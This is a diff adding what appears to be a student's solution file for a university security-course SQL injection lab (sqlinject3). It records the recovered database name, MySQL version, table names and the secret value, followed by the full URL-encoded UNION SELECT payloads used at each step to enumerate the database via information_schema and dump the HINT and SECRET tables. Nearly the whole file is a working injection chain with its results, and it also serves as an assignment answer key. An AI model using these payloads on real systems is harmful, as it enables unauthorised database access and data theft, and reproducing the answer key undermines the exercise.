@@ -1,0 +1,25 @@
+Database: proj2_inject3
+Version:5.5.60-0ubuntu0.14.04.1
+table:HINT,SECRET,foo,inject3_users
+secret:lacrimal
+
+
+
+First URL:
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=1%27+and+FALSE+union+select+1%2C+database%28%29%2C2%2C3%23
+
+Second URL:
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=1%27+and+FALSE+union+select+1%2C+version%28%29%2C2%2C3%23
+
+Third URL:
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=1%27+and+FALSE+union+select+1%2C2%2C3%2C+GROUP_CONCAT%28table_name+SEPARATOR%27%2C%27%29+from+information_schema.tables+where+table_type+%3D+%27base+table%27+and+table_schema+%3D+%27proj2_inject3%27%23
+
+Fourth URL:
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=1%27+and+FALSE+union+select+1%2C2%2C3%2C+GROUP_CONCAT%28+column_name+SEPARATOR%27%2C%27%29+from+information_schema.columns+where+table_name%3D%27SECRET%27%23
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=1%27+and+FALSE+union+select+1%2C2%2C3%2C+GROUP_CONCAT%28+column_name+SEPARATOR%27%2C%27%29+from+information_schema.columns+where+table_name%3D%27HINT%27%23
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=1%27+and+FALSE+union+select+1%2C2%2C3%2C+GROUP_CONCAT%28+message+SEPARATOR%27%2C%27%29+from+HINT%23
+http://bungle-cs461.cs.illinois.edu/sqlinject3/?id=1%27+and+FALSE+union+select+1%2C2%2C3%2C+GROUP_CONCAT%28+secret+SEPARATOR%27%2C%27%29+from+SECRET+where+hash%3D%2249a60090e1291fbb7a00eff70dd3bdf0%22%23
+
+
+
+
